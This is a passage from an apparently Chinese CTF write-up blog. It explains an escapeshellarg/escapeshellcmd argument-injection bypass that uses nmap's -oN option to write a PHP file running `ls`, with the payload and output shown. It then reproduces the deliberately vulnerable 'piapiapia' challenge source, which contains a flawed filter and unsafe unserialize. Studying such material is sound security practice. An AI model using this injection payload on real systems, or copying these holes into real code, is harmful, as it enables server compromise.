，后面两个单引号单独成组 <code>&#39;&#39;</code> ，只剩下结尾的一个 <code>&#39;</code> 被转义 <code>\\&#39;</code> </p>\n<p>最后执行的命令就变成了 <code>curl &#39;127.0.0.1&#39;\\ -v -d a=1&#39;</code> , 请求的是 <code>127.0.0.1\\</code> , POST的数据是 <code>a=1&#39;</code> .</p>\n<p>回到题目可以看到使用的是 <code>&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host</code>  ,而通过查看 nmap 手册发现输出命令，我们试一下</p>\n<p><code>nmap 127.0.0.1 -oN 1.php</code> </p>\n<p>查看 1.php 内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap 7.70 scan initiated Thu Apr 23 19:48:07 2020 as: nmap -oN 1.php 127.0.0.1</span></span><br><span class=\"line\">Nmap scan report for localhost (127.0.0.1)</span><br><span class=\"line\">Host is up (0.0000060s latency).</span><br><span class=\"line\">Not shown: 998 closed ports</span><br><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">80/tcp  open  http</span><br><span class=\"line\">111/tcp open  rpcbind</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap <span class=\"keyword\">done</span> at Thu Apr 23 19:48:08 2020 -- 1 IP address (1 host up) scanned <span class=\"keyword\">in</span> 0.51 seconds</span></span><br></pre></td></tr></table></figure>\n\n<p>有了上面的知识后，剩下的就是想办法绕过题目的限制</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">example.php</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$param1 = <span class=\"string\">\" ' &lt;?php echo `ls`;?&gt; -oN 1.php ' \"</span>;</span><br><span class=\"line\">$ep = escapeshellarg($param1);</span><br><span class=\"line\">$eep = escapeshellcmd($ep);</span><br><span class=\"line\">$cmd = <span class=\"string\">\"nmap \"</span>.$eep;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $eep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">system($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"> <span class=\"string\">' &lt;?php echo `ls`;?&gt; -oN 1.php '</span> </span><br><span class=\"line\"><span class=\"string\">' '</span>\\<span class=\"string\">''</span> <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">echo</span> `ls`;<span class=\"meta\">?&gt;</span> -oN <span class=\"number\">1.</span>php <span class=\"string\">'\\''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">'</span> <span class=\"string\">'\\\\'</span><span class=\"string\">' \\&lt;\\?php echo \\`ls\\`\\;\\?\\&gt; -oN 1.php '</span>\\\\<span class=\"string\">''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">nmap '</span> <span class=\"string\">'\\\\'</span><span class=\"string\">' \\&lt;\\?php echo \\`ls\\`\\;\\?\\&gt; -oN 1.php '</span>\\\\<span class=\"string\">''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-23 20:06 CST</span></span><br></pre></td></tr></table></figure>\n\n<p>查看 1.php 可以看到执行的命令是</p>\n<p><code>nmap -oN 1.php \\ &lt;?php echo</code>ls<code>;?&gt; \\\\</code></p>\n<p> 我们传入参数 <code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php &#39;</code>  , 加的单引号目的是为了通过单引号闭合转义加上的单引号。</p>\n<p>需要注意的是参数后面的单引号需要隔一个空格，不然生成的文件名就会是 <code>.php\\\\</code> ,不能被正常解析了。 随机我们运行 1.php ,可以看到成功解析了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~/桌面# php 1.php</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap 7.70 scan initiated Sat Apr 25 11:16:03 2020 as: nmap -oN 1.php \\ 1.php</span></span><br><span class=\"line\">1.php\\\\ </span><br><span class=\"line\">1.txt</span><br><span class=\"line\">ctf</span><br><span class=\"line\">dc-2.txt</span><br><span class=\"line\">escapeshellarg.php</span><br><span class=\"line\">index.php~</span><br><span class=\"line\">pickle1.py</span><br><span class=\"line\">shell-7.x-1.0-beta5.zip</span><br><span class=\"line\">shell.py</span><br><span class=\"line\">snippet.py</span><br><span class=\"line\">test.php</span><br><span class=\"line\">th.jpeg</span><br><span class=\"line\">top6000.txt</span><br><span class=\"line\"> \\\\</span><br><span class=\"line\">Failed to resolve \"\\\".</span><br><span class=\"line\">Failed to resolve \"&lt;?php\".</span><br></pre></td></tr></table></figure>\n\n<p>对于本题，可以传入</p>\n<p><code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php  &#39;</code></p>\n<h3 id=\"piapiapia\"><a href=\"#piapiapia\" class=\"headerlink\" title=\"piapiapia\"></a>piapiapia</h3><p>扫描目录得到源码</p>\n<p>class.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span>(<span class=\"string\">'config.php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span> <span class=\"keyword\">extends</span> <span class=\"title\">mysql</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $table = <span class=\"string\">'users'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_exists</span><span class=\"params\">($username)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">register</span><span class=\"params\">($username, $password)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$password = <span class=\"keyword\">parent</span>::filter($password);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$key_list = <span class=\"keyword\">Array</span>(<span class=\"string\">'username'</span>, <span class=\"string\">'password'</span>);</span><br><span class=\"line\">\t\t$value_list = <span class=\"keyword\">Array</span>($username, md5($password));</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::insert(<span class=\"keyword\">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($username, $password)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$password = <span class=\"keyword\">parent</span>::filter($password);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t$object = <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_profile</span><span class=\"params\">($username)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t$object = <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> $object-&gt;profile;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$new_profile = <span class=\"keyword\">parent</span>::filter($new_profile);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">__class__</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">mysql</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $link = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">connect</span><span class=\"params\">($config)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">$this</span>-&gt;link = mysql_connect(</span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'hostname'</span>],</span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'username'</span>], </span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'password'</span>]</span><br><span class=\"line\">\t\t);</span><br><span class=\"line\">\t\tmysql_select_db($config[<span class=\"string\">'database'</span>]);</span><br><span class=\"line\">\t\tmysql_query(<span class=\"string\">\"SET sql_mode='strict_all_tables'\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;link;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">select</span><span class=\"params\">($table, $where, $ret = <span class=\"string\">'*'</span>)</span> </span>&#123;</span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"SELECT $ret FROM $table WHERE $where\"</span>;</span><br><span class=\"line\">\t\t$result = mysql_query($sql, <span class=\"keyword\">$this</span>-&gt;link);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_fetch_object($result);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">insert</span><span class=\"params\">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class=\"line\">\t\t$key = implode(<span class=\"string\">','</span>, $key_list);</span><br><span class=\"line\">\t\t$value = <span class=\"string\">'\\''</span> . implode(<span class=\"string\">'\\',\\''</span>, $value_list) . <span class=\"string\">'\\''</span>; </span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"INSERT INTO $table ($key) VALUES ($value)\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_query($sql);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"UPDATE $table SET $key = '$value' WHERE $where\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_query($sql);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">\t\t$escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>);</span><br><span class=\"line\">\t\t$escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; <span class=\"comment\">// \\|\\\\\\\\</span></span><br><span class=\"line\">\t\t$string = preg_replace($escape, <span class=\"string\">'_'</span>, $string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">\t\t$safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">__class__</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">$user = <span class=\"keyword\">new</span> user();</span><br><span class=\"line\">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>\n\n<p>config.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'password'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'database'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t$flag = <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>profile.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\trequire_once(&apos;class.php&apos;);</span><br><span class=\"line\">\tif($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class=\"line\">\t\tdie(&apos;Login First&apos;);\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$username = $_SESSION[&apos;username&apos;];</span><br><span class=\"line\">\t$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\">\tif($profile  == null) &#123;</span><br><span class=\"line\">\t\theader(&apos;Location: update.php&apos;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\t$profile = unserialize($profile);</span><br><span class=\"line\">\t\t$phone = $profile[&apos;phone&apos;];</span><br><span class=\"line\">\t\t$email = $profile[&apos;email&apos;];</span><br><span class=\"line\">\t\t$nickname = $profile[&apos;nickname&apos;];</span><br><span class=\"line\">\t\t$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class=\"line\">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class=\"line\">\t\t&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class=\"line\">\t\t&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span><br><span class=\"line\">\t\t&lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span><br><span class=\"line\">\t\t&lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\trequire_once(&apos;class.php&apos;);</span><br><span class=\"line\">\tif($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class=\"line\">\t\tdie(&apos;Login First&apos;);\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = $_SESSION[&apos;username&apos;];</span><br><span class=\"line\">\t\tif(!preg_match(&apos;/^\\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid phone&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid email&apos;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tif(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid nickname&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$file = $_FILES[&apos;photo&apos;];</span><br><span class=\"line\">\t\tif($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class=\"line\">\t\t\tdie(&apos;Photo size error&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmove_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class=\"line\">\t\t$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$user-&gt;update_profile($username, serialize($profile));</span><br><span class=\"line\">\t\techo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class=\"line\">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class=\"line\">\t\t&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class=\"line\">\t\t\t&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Email:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span 